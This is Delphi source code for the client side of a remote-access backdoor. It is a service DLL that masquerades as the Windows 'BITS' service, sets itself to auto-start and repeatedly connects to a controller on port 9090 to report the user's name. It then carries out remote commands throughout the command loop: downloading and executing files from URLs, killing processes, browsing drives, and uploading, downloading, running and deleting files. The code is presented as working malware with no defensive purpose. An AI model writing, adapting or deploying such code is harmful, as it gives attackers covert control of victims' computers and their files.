{
  自注入进程 Client
}
library Clinet001;

uses
  Windows, WinSvc, WinSvcUnit, SocketUnit, VarUnit, FuncUnit, MainUnit, ShellAPI, UrlMon;

const
  MasterMutex = 'Anskya_Drache_Client_001';                   //  互斥体
  MasterDNSE  = 'Localhost+++++++++++++++++++++++++++++++++'; //  链接DNS
  MasterPort  = 9090;                                         //  链接端口
  MasterServiceName = 'BITS';                                 //  服务名称

var
  MasterSocket: TClientSocket;
  dwCurrState : DWORD;
  SvcStatsHandle: SERVICE_STATUS_HANDLE;
  srvStatus: service_status;

//  Client工作线程
function ClientWork(stSocket: TClientSocket): DWORD;
var
  dwResult, dwSocketCmd: DWORD;
  StrBuffer, StrTemp: String;
  lpBuffer: Pointer;
  MiniBuffer: TMinBufferHeader;
  bIsNotError: Boolean;
begin
  Result := Sock_Error;
  if (Not stSocket.Connected) then Exit;

  while True do
  begin
    MasterSocket.Idle(0);
    dwResult := stSocket.ReceiveLength;
    if dwResult = 0 then
    begin
      dwResult := stSocket.SendBuffer(lpBuffer, 2);
    end;
    if (Not (stSocket.Connected)) then Break;
    if (dwResult < 4) then Continue;
    dwResult := dwResult + 1;

    GetMem(lpBuffer, dwResult);
    ZeroMemory(lpBuffer, dwResult);
    dwResult := stSocket.ReceiveBuffer(lpBuffer^, dwResult);
    //  判断数据包长度
    Case dwResult of
      MIN_BUFFER_SIZE:
      begin
        dwSocketCmd := PMinBufferHeader(lpBuffer)^.dwSocketCmd;
      end;

      MinEx_BUFFER_SIZE:
      begin
        dwSocketCmd := PMinExBufferHeader(lpBuffer)^.dwSocketCmd;
        dwResult := PMinExBufferHeader(lpBuffer)^.dwBufferSize;
      end;
    else
      dwSocketCmd := PMinBufferHeader(lpBuffer)^.dwSocketCmd;
      StrBuffer := String(Pchar(@(Pchar(lpBuffer)[4])));
    end;
    FreeMem(lpBuffer);

    //  分离命令头部并解析命令头部
    case dwSocketCmd of

      //  Ping功能
      Client_Ping:
      begin
        MessageBox(0, Pchar(StrBuffer), 'By Drache', 0);
      end;

      //  Close Client
      Client_Close:
      begin
        Result := Sock_Close;
        Break;
      end;

      //  Remove Client
      Client_Remove:
      begin
        //  设置服务为停止状态
        ConfigServiceEx(MasterServiceName, SERVICE_DISABLED);
        Result := Sock_Close;
        ExitProcess(0);
        Break;
      end;

      //  Downloader
      Client_Download:
      begin
        StrTemp := GetSetupPathEx(2) + ExtractURLName(StrBuffer);
        if URLDownloadToFile(nil, Pchar(StrBuffer), Pchar(StrTemp), 0, nil)= S_OK then
        begin
          ShellExecute(0, 'Open', Pchar(StrTemp), nil, nil, SW_SHOW);
        end;
      end;

      //  Get Process List
      Client_GetProcessList:
      begin
        SendData(stSocket, Client_GetProcessList, GetProcessList());
      end;

      //  Kill Process
      Client_KillProcess:
      begin
        KillProcessByPID(dwResult);
      end;

      //-------------------------------------------------------------------------
      //  获取磁盘列表
      Get_DiskList:
      begin
        SendData(stSocket, Get_DiskList, GetDriveList());
      end;
      //  获取目录列表(目录名称)
      Get_DirList:
      begin
        SendData(stSocket, Get_DirList, ListFiles(0, StrBuffer));
      end;
      //  获取文件列表(文件名+文件大小)
      Get_FileList:
      begin
        SendData(stSocket, Get_FileList, ListFiles(1, StrBuffer));
      end;

      //  文件操作
      File_Execute:
      begin
        ShellExecute(0, 'Open', Pchar(StrBuffer), nil, nil, SW_SHOW);
      end;

      //  删除文件
      File_Delete:
      begin
        DeleteFile(Pchar(StrBuffer));
      end;

      //  新建文件夹
      Dir_New:
      begin
        CreateDirectory(Pchar(StrBuffer), nil);
      end;

      //  删除文件夹
      Dir_Delete:
      begin
        RemoveDirectory(Pchar(StrBuffer));
      end;

      //  下载文件
      File_DownLoadBegin:
      begin
        bIsNotError := DownloadFile(stSocket, Pchar(StrBuffer));
        if bIsNotError then MiniBuffer.dwSocketCmd := File_DownloadEnd
        else MiniBuffer.dwSocketCmd := File_IO_Error;
        stSocket.SendBuffer(MiniBuffer, MIN_BUFFER_SIZE);
      end;
      
      //  上传文件
      File_UploadBegin:
      begin
        UploadFile(stSocket, Pchar(StrBuffer));
      end;

    else

    end;
  end;
end;

//////////////////////////////////////////////////////////////////////////////////////
//  网络执行主线程
procedure WinMain();
var
  dwResult: DWORD;
  StrBuffer: String;
  MinBuffer: TMinBufferHeader;
begin
  MasterSocket := TClientSocket.Create;

  //  循环连接Server
  while Not (MasterSocket.Connected) do
  begin
    MasterSocket.Connect(MasterDNSE, MasterPort);
    if MasterSocket.Connected then
    begin
      //  发送上线数据包
      StrBuffer := GetPcUserName(0) + '|' + GetPcUserName(1) + '|';
      if SendData(MasterSocket, Client_Online, StrBuffer) then
      begin
        //  判断是否连接超时
        if MasterSocket.Idle(3) <= 0 then
        begin
          MasterSocket.Disconnect;
          Continue;
        end;

        //  判断接受的数据包是否长度为4,而且数据包的命令标识是上线成功的指令
        dwResult := MasterSocket.ReceiveBuffer(MinBuffer, Sizeof(TMinBufferHeader));
        if (dwResult = 4) and (MinBuffer.dwSocketCmd = Client_Online) then
        begin
          dwResult := ClientWork(MasterSocket);
          if dwResult = Sock_Close then
          begin
            MasterSocket.Disconnect;
            Break;
          end;
        end else
        begin
          MasterSocket.Disconnect;
          Continue;
        end;
      end;
    end;
    MasterSocket.Disconnect;        //  断开连接进行下一次循环
    Sleep(10000);
  end;
  MasterSocket.Free;
end;

//  服务主线程
procedure ServiceWinMain;
begin
  OutputDebugString('服务主功能开始!');
  //GetDebugPrivs;
  WinMain();
end;

{ 与SCM管理器通话 }
function TellSCM(dwState: DWORD; dwExitCode: DWORD; dwProgress: DWORD ): Boolean;
begin
  srvStatus.dwServiceType := SERVICE_WIN32_SHARE_PROCESS;
  dwCurrState := dwState;
  srvStatus.dwCurrentState := dwState;
  srvStatus.dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE or SERVICE_ACCEPT_SHUTDOWN;
  srvStatus.dwWin32ExitCode := dwExitCode;
  srvStatus.dwServiceSpecificExitCode := 0;
  srvStatus.dwCheckPoint := dwProgress;
  srvStatus.dwWaitHint := 1000;
  Result := SetServiceStatus(SvcStatsHandle, srvStatus );
end;

{ Service 控制函数 }
procedure servicehandler(fdwcontrol: integer); stdcall;
begin
  case fdwcontrol of
    SERVICE_CONTROL_STOP:
    begin
      TellSCM(SERVICE_STOP_PENDING, 0, 1);
      Sleep(10);
      TellSCM(SERVICE_STOPPED, 0, 0);
    end;

    SERVICE_CONTROL_PAUSE:
    begin
      TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
      TellSCM(SERVICE_PAUSED, 0, 0);
    end;

    SERVICE_CONTROL_CONTINUE:
    begin
      TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
      TellSCM(SERVICE_RUNNING, 0, 0 );
    end;
    
    SERVICE_CONTROL_INTERROGATE: TellSCM(dwCurrState, 0, 0);
    SERVICE_CONTROL_SHUTDOWN: TellSCM(SERVICE_STOPPED, 0, 0);
  end;
end;

//  service main 入口函数
procedure ServiceMain(argc : Integer; var argv : pchar ); stdcall;
begin
  Sleep(3000);
  if Not CreatedMutexEx(MasterMutex) then ExitProcess(0);
  
  // 注册控制函数
  SvcStatsHandle := RegisterServiceCtrlHandler(MasterServiceName, @servicehandler);
  if (SvcStatsHandle = 0) then
  begin
    OutputDebugString('Error in RegisterServiceCtrlHandler');
    ExitProcess(0);
  end else
  begin
    //  改变自身启动模式
    if ConfigServiceEx(MasterServiceName, SERVICE_AUTO_START) then OutputDebugString('Setting Service AutoRun Done!')
    else OutputDebugString('Setting Service AutoRun Error!');
  end;

  // 启动服务
  TellSCM(SERVICE_START_PENDING, 0, 1);
  TellSCM(SERVICE_RUNNING, 0, 0);
  OutputDebugString('Service is Running');
  // 这里可以执行我们真正要作的代码
  while ((dwCurrState <> SERVICE_STOP_PENDING) and (dwCurrState <> SERVICE_STOPPED)) do
  begin
    ServiceWinMain;
  end;
  OutputDebugString('Service Exit');
end;

{ dll入口和出口处理函数 }
procedure DLLEntryPoint(dwReason : DWord);
begin
  case dwReason of
    DLL_PROCESS_ATTACH:  ;
    DLL_PROCESS_DETACH:  ;
    DLL_THREAD_ATTACH:   ;
    DLL_THREAD_DETACH:   ;
  end;
end;

// 导出函数列表
exports
  ServiceMain;

begin
  DllProc := @DLLEntryPoint;
end.
